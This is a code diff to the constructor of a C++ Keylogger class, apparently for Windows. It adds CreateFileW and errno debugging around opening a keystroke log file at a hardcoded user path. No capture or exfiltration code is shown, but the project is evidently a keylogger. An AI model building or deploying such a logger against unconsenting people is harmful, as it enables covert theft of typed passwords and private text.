@@ -4,7 +4,30 @@ std::ofstream Keylogger::kblog;
 wchar_t* Keylogger::key = nullptr;
 
 Keylogger::Keylogger(wchar_t* k) {
-    kblog = std::ofstream("C:\\Users\\brennan\\Downloads\\kb_log.txt", std::ios::app);
+    HANDLE hFile = CreateFileW(
+        L"C:\\Users\\brennan\\Downloads\\kb_log.txt",
+        GENERIC_WRITE,
+        FILE_SHARE_READ | FILE_SHARE_WRITE,
+        NULL,
+        OPEN_ALWAYS,
+        FILE_ATTRIBUTE_NORMAL,
+        NULL
+    );
+
+    if (hFile == INVALID_HANDLE_VALUE)
+    {
+        std::cerr << "CreateFileW FAILED: "
+                  << GetLastError() << '\n';
+    }
+    else
+    {
+        std::cerr << "CreateFileW SUCCESS\n";
+        CloseHandle(hFile);
+    }
+
+    errno = 0;
+
+    kblog = std::ofstream("kb_log.txt", std::ios::app);
 
     std::cerr << "After OPEN: " << kblog.is_open() << std::endl;
 
@@ -12,6 +35,9 @@ Keylogger::Keylogger(wchar_t* k) {
     kblog.flush();
 
     std::cerr << "After write: " << kblog.good() << std::endl;
+
+    std::cerr << "errno: " << errno << '\n';
+    std::cerr << "error: " << strerror(errno) << '\n'; 
 
     key = k;
 }
